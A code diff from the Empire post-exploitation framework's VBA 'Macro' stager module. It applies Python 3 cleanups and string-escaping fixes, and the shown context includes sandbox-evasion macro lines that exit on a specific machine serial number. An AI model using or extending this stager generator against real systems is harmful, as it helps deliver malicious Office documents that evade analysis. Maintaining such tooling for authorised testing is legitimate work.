@@ -1,17 +1,14 @@
-from __future__ import print_function
-
 import logging
 import random
 import string
-from builtins import object, range, str
 
 from empire.server.common import helpers
 
 log = logging.getLogger(__name__)
 
 
-class Stager(object):
-    def __init__(self, mainMenu, params=[]):
+class Stager:
+    def __init__(self, mainMenu):
         self.info = {
             "Name": "Macro",
             "Authors": [
@@ -92,7 +89,7 @@ class Stager(object):
                 "Value": "default",
             },
             "ProxyCreds": {
-                "Description": "Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
+                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                 "Required": False,
                 "Value": "default",
             },
@@ -111,11 +108,6 @@ class Stager(object):
         }
 
         self.mainMenu = mainMenu
-
-        for param in params:
-            option, value = param
-            if option in self.options:
-                self.options[option]["Value"] = value
 
     def generate(self):
         # extract all of our options
@@ -207,7 +199,7 @@ class Stager(object):
 
             if outlook_evasion_bool is True:
                 macro += '\tstrComputer = "."\n'
-                macro += '\tSet objWMIService = GetObject("winmgmts:\\\\" & strComputer & "\\root\cimv2")\n'
+                macro += '\tSet objWMIService = GetObject("winmgmts:\\\\" & strComputer & "\\root\\cimv2")\n'
                 macro += '\tSet ID = objWMIService.ExecQuery("Select IdentifyingNumber from Win32_ComputerSystemproduct")\n'
                 macro += "\tFor Each objItem In ID\n"
                 macro += '\t\tIf StrComp(objItem.IdentifyingNumber, "2UA20511KN") = 0 Then End\n'
